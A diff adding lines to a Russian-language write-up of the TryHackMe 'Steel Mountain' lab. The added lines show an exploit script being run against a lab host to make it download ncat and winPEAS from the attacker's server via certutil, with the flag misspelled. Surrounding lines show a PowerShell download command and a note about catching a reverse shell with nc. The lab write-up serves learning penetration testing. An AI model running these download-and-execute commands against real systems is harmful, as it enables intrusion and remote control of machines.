@@ -318,6 +318,14 @@ Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 └─$ python3 x.py 10.10.54.54 8080 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe (New-Object Net.WebClient).DownloadFile('http://10.21.104.16:8888/winPEASx64.exe','C:\Users\Public\winPEASx64.exe')"
 ```
 
+Более понятная команда для скачивания certutil:
+```bash
+┌──(kali㉿0x2d-pentest)-[~/Labs/thm/SteelMountain/exploits]
+└─$ python3 x.py 10.10.54.54 8080 "certutil -urlcahe -f http://10.21.104.16:8888/ncat.exe ncat.exe"
+┌──(kali㉿0x2d-pentest)-[~/Labs/thm/SteelMountain/exploits]
+└─$ python3 x.py 10.10.54.54 8080 "certutil -urlcahe -f http://10.21.104.16:8888/winPEASany.exe winPEASany.exe"
+```
+
 Запускаю nc для поимки реверса и отправляю с жертвы запрос
 ```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/thm/SteelMountain/exploits]
